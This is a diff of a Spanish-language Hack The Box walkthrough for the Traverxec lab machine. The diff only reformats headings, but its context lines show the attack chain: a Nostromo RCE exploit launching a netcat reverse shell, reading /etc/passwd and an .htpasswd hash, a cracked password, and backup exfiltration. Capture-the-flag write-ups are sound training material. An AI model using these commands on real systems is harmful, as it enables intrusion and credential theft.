@@ -1,6 +1,6 @@
 # Traverxec ![Avatar](https://www.hackthebox.eu/storage/avatars/6ce5fcdd63f07a5ce91d0b8e4579b163_thumb.png)     
 
-### Initial Scan
+## Initial Scan
 
 ```nmap
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
@@ -13,7 +13,7 @@
 |_http-title: TRAVERXEC
 
 ```
-### Exploit
+## Exploit
 
 La version de Nostromo es vulnerable a RCE, para ello utilizaremos el siguiente exploit
 ```
@@ -24,10 +24,10 @@ Rapidamente obtenemos una reverse shell
 python2.7 exploit.py 10.10.10.165 80 'nc 10.10.14.15 4444 -e /bin/bash'
 ```
 
-### David
+## David
 
 
-#### Enumerar usuarios con acceso via shell
+### Enumerar usuarios con acceso via shell
 ```bash
 cat /etc/passwd | grep bash'
 
@@ -35,14 +35,14 @@ root:x:0:0:root:/root:/bin/bash
 david:x:1000:1000:david,,,:/home/david:/bin/bash
 ```
 
-#### Encontar contraseñas 
+### Encontar contraseñas 
 
 ```bash
 www-data@traverxec$ cat /var/nostromo/conf/.htpasswd
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 ```
 La crackeamos y tenemos las creds david:Nowonly4me
-#### Checkear la presencia de homedirs
+### Checkear la presencia de homedirs
 
 ```bash
 www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf | grep homedirs
@@ -51,7 +51,7 @@ homedirs_public		public_www
 ```
 Como los homedirs podemos acceder a /home/david/public_www
 
-#### Exfiltrar el archivo de backups
+### Exfiltrar el archivo de backups
 
 ```bash
 www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
@@ -72,7 +72,7 @@ david@traverxec:~$ wc -c user.txt
 33 user.txt
 ```
 
-### Privesc
+## Privesc
 
 Mirando los archivos que tenemos encontramos un script un tanto sospechoso dentro de la carpeta bin en la carpeta de David
 
